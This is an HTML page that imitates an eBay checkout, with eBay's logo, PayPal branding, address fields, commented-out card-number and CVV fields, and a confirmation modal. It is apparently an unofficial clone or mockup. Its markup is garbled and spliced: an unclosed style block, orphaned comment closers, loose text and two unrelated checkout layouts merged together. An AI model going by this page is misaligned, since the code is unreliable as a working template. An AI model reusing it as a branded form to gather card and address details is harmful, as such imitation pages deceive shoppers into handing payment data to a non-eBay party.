<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>eBay Checkout</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Market Sans', Arial, sans-serif;
            background-color: #f7f7f7;
            color: #191919;
        }

        .header {
            background: white;
            padding: 16px 24px;
            border-bottom: 1px solid #e5e5e5;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

	<link rel="stylesheet" href="assets/css/checkout.css">

</head>
<body>
    <div class="header">
        <div class="logo-section">
            <svg class="ebay-logo" xmlns="http://www.w3.org/2000/svg" width="117" height="48" viewBox="0 0 122 48.592" aria-labelledby="ebayLogoTitle"><title id="ebayLogoTitle">eBay Home</title><g><path fill="#F02D2D" d="M24.355 22.759c-.269-5.738-4.412-7.838-8.826-7.813-4.756.026-8.544 2.459-9.183 7.915zM6.234 26.93c.364 5.553 4.208 8.814 9.476 8.785 3.648-.021 6.885-1.524 7.952-4.763l6.306-.035c-1.187 6.568-8.151 8.834-14.145 8.866C4.911 39.844.043 33.865-.002 25.759c-.05-8.927 4.917-14.822 15.765-14.884 8.628-.048 14.978 4.433 15.033 14.291l.01 1.625z"></path><path fill="#0968F6" d="M46.544 35.429c5.688-.032 9.543-4.148 9.508-10.32s-3.947-10.246-9.622-10.214-9.543 4.148-9.509 10.32 3.974 10.245 9.623 10.214zM30.652.029l6.116-.034.085 15.369c2.978-3.588 7.1-4.65 11.167-4.674 6.817-.037 14.412 4.518 14.468 14.454.045 8.29-5.941 14.407-14.422 14.454-4.463.026-8.624-1.545-11.218-4.681a33.237 33.237 0 01-.19 3.731l-5.994.034c.09-1.915.185-4.364.174-6.322z"></path><path fill="#FFBD14" d="M77.282 25.724c-5.548.216-8.985 1.229-8.965 4.883.013 2.365 1.94 4.919 6.7 4.891 6.415-.035 9.826-3.556 9.794-9.289v-.637c-2.252.02-5.039.054-7.529.152zm13.683 7.506c.01 1.778.071 3.538.232 5.1l-5.688.032a33.381 33.381 0 01-.225-3.825c-3.052 3.8-6.708 4.909-11.783 4.938-7.532.042-11.585-3.915-11.611-8.518-.037-6.665 5.434-9.049 14.954-9.318 2.6-.072 5.529-.1 7.945-.116v-.637c-.026-4.463-2.9-6.285-7.854-6.257-3.68.021-6.368 1.561-6.653 4.2l-6.434.035c.645-6.566 7.53-8.269 13.595-8.3 7.263-.04 13.406 2.508 13.448 10.192z"></path><path fill="#92C821" d="M91.939 19.852l-4.5-8.362 7.154-.04 10.589 20.922 10.328-21.02 6.486-.048-18.707 37.251-6.85.039 5.382-10.348-9.887-18.393"></path></g></svg>
            <div class="checkout-text">Checkout</div>
        </div>
        <div>
            <span style="font-size: 13px; color: #767676;">How do you like our checkout?</span>
            <a href="#" class="feedback-link">Give us feedback</a>
        </div>
    </div>

    <div class="paypal-banner">
        <div class="paypal-logo">PayPal</div>
        <span style="font-size: 14px;">Buy with PayPal. It's fast and simple.</span>
    </div>

    <div class="container">
        <div class="main-content">
            <!-- Pay with Section -->
            <div class="section">
                <h2 class="section-title">Pay with</h2>
                
                <div class="payment-option">
                    <div class="radio-btn"></div>
                    <div class="payment-logo">
                        <div class="paypal-logo">PayPal</div>
                        <span style="font-size: 14px; font-weight: 500;">PayPal</span>
                    </div>
                </div>

	<main class="main-container">
        <div class="container">
            <div class="checkout-layout">
                <!-- Left Column - Form -->
                <div class="checkout-form">
                    <!-- Shipping Address -->
                   <section class="form-section">
                        <div class="section-header">
                            <h2>Shipping Address</h2>
                            <a href="#" class="change-link">Change</a>
                        </div>
                        <div class="form-group">
                            <label for="name">Full Name *</label>
                            <input type="text" id="name" placeholder="John Doe" required>
                        </div>
                        <div class="form-group">
                            <label for="address">Street Address *</label>
                            <input type="text" id="address" placeholder="123 Main Street" required>
                        </div>
                        <div class="form-row">
                            <div class="form-group">
                                <label for="city">City *</label>
                                <input type="text" id="city" placeholder="New York" required>
                            </div>
                            <div class="form-group">
                                <label for="state">State *</label>
                                <input type="text" id="state" placeholder="NY" required>
                            </div>
                        </div>
                        <div class="form-row">
                            <div class="form-group">
                                <label for="country">Country *</label>
                                <input type="text" id="country" placeholder="United States" required>
                            </div>
                            <div class="form-group">
                                <label for="phone">Phone Number *</label>
                                <input type="tel" id="phone" placeholder="(123) 456-7890" required>
                            </div>
                        </div>
                        </section>

                    Shipping Method
                    <section class="form-section">
                        <div class="section-header">
                            <h2>Shipping Method</h2>
                        </div>
                        <div class="shipping-options">
                            <label class="radio-option selected">
                                <input type="radio" name="shipping" value="standard" checked>
                                <div class="option-content">
                                    <span class="option-title">Standard Shipping (5-7 business days)</span>
                                    <span class="option-price">FREE</span>
                                </div>
                            </label>
                            <label class="radio-option">
                                <input type="radio" name="shipping" value="express">
                                <div class="option-content">
                                    <span class="option-title">Express Shipping (2-3 business days)</span>
                                    <span class="option-price">$9.99</span>
                                </div>
                            </label>
                            <label class="radio-option">
                                <input type="radio" name="shipping" value="overnight">
                                <div class="option-content">
                                    <span class="option-title">Overnight Shipping (1 business day)</span>
                                    <span class="option-price">$19.99</span>
                                </div>
                            </label>
                        </div>
                    </section>

                    <!-- Payment Method -->
                    <section class="form-section">
                        <div class="section-header">
                            <h2>Payment Method</h2>
                        </div>
                        <div class="payment-options">
                            <label class="radio-option selected">
                                <input type="radio" name="payment" value="credit" checked>
                                <span class="option-title">Credit Card</span>
                            </label>
                            <label class="radio-option">
                                <input type="radio" name="payment" value="paypal">
                                <span class="option-title">PayPal</span>
                            </label>
                            <label class="radio-option">
                                <input type="radio" name="payment" value="apple">
                                <span class="option-title">Apple Pay</span>
                            </label>
                        </div>

                        <!-- Credit Card Form -->

                                <label for="cardname">Cardholder Name *</label>
                                <input type="text" id="cardname" placeholder="John Doe" required>
                            </div>
                            <div class="form-group">
                                <label for="cardnumber">Card Number *</label>
                                <input type="text" id="cardnumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
                            </div>
                            <div class="form-row">

                                    <input type="text" id="cvv" placeholder="123" maxlength="4" required>
                                </div>
                            </div>
                        </div>
                    </section> -->

                    <!-- Billing Address
                    <section class="form-section">
                        <div class="section-header">
                            <h2>Billing Address</h2>
                            <label class="checkbox">
                                <input type="checkbox" id="same-address" checked>
                                Same as shipping
                            </label>
                        </div>
                        <div id="billing-form" style="display: none;">
                            <div class="form-group">
                                <label for="billing-address">Street Address *</label>
                                <input type="text" id="billing-address" placeholder="123 Main Street">
                            </div>
                            <div class="form-row">
                                <div class="form-group">
                                    <label for="billing-city">City *</label>
                                    <input type="text" id="billing-city" placeholder="New York">
                                </div>
                                <div class="form-group">
                                    <label for="billing-state">State *</label>
                                    <input type="text" id="billing-state" placeholder="NY">
                                </div>
                            </div>
                        </div>
                    </section> -->
                </div>

                <!-- Right Column - Order Summary -->
                <aside class="order-summary">
                    <h3>Order Summary</h3>
                    
                    <!-- Cart Items -->
                    <div class="cart-items">
                        <div class="cart-item">
                            <img src="/placeholder.svg?height=80&width=80" alt="Product">
                            <div class="item-details">
                                <h4>Premium Wireless Headphones</h4>
                                <p class="seller">by TechStore</p>
                                <p class="quantity">Qty: 1</p>
                            </div>
                            <div class="item-price">$79.99</div>
                        </div>
                        <div class="cart-item">
                            <img src="/placeholder.svg?height=80&width=80" alt="Product">
                            <div class="item-details">
                                <h4>USB-C Cable (2-pack)</h4>
                                <p class="seller">by AudioGear</p>
                                <p class="quantity">Qty: 2</p>
                            </div>
                            <div class="item-price">$19.98</div>
                        </div>
                    </div>

                    <!-- Price Breakdown -->
                    <div class="price-breakdown">
                        <div class="price-row">
                            <span>Subtotal</span>
                            <span>$99.97</span>
                        </div>
                        <div class="price-row">
                            <span>Shipping</span>
                            <span id="shipping-cost">FREE</span>
                        </div>
                        <div class="price-row">
                            <span>Tax</span>
                            <span>$8.49</span>
                        </div>
                        <div class="divider"></div>
                        <div class="price-row total">
                            <span>Total</span>
                            <span id="total-price">$108.46</span>
                        </div>
                    </div>

                    <!-- Place Order Button -->
                    <button class="btn-primary" id="place-order-btn">Place Your Order</button>
                    
                    <!-- Continue Shopping -->
                    <button class="btn-secondary">Continue Shopping</button>

                    <!-- Trust Signals -->
                    <div class="trust-signals">
                        <p>✓ Secure payment</p>
                        <p>✓ eBay Money Back Guarantee</p>
                        <p>✓ Buyer Protection</p>
                    </div>
                </aside>
            </div>
        </div>
    </main>

	<!-- Order Confirmation Modal -->
    <div class="modal" id="confirmation-modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2>Order Confirmed!</h2>
                <button class="close-btn">&times;</button>
            </div>
            <div class="modal-body">
                <div class="success-icon">✓</div>
                <p>Thank you for your purchase!</p>
                <p class="order-id">Order #<span id="order-number"></span></p>
                <p>A confirmation email has been sent to your email address.</p>
            </div>
            <div class="modal-footer">
                <button class="btn-primary" onclick="window.location.reload()">Back to Shopping</button>
            </div>
        </div>
    </div>

            <!-- Review order Section -->
            <div class="section">
                <h2 class="section-title">Review order</h2>
                
                <div class="seller-info">
                    <div class="seller-badge">TPN</div>
                    <span style="font-size: 14px; font-weight: 500;">FromNippon</span>
                    <span style="font-size: 12px; color: #767676;">Add note for seller</span>
                    <span style="font-size: 12px; color: #00A650; margin-left: auto;">99.9% positive feedback</span>
                </div>

                <div class="product-item">
                    <div class="product-image"></div>
                    <div class="product-details">
                        <div class="last-one-badge">LAST ONE</div>
                        <div class="product-title">JAPAN Aku no P(motiy) novel: Aku no Tazai series "The Lunacy of Duke Venomania"</div>
                        <div class="product-price">US $14.58</div>
                        <div style="font-size: 13px; color: #767676; margin-bottom: 8px;">Quantity: 1</div>
                        <div style="font-size: 13px; color: #00A650;">Free returns</div>
                    </div>
                </div>

	<script src="assets/js/checkout.js"></script>

</body>
</html>
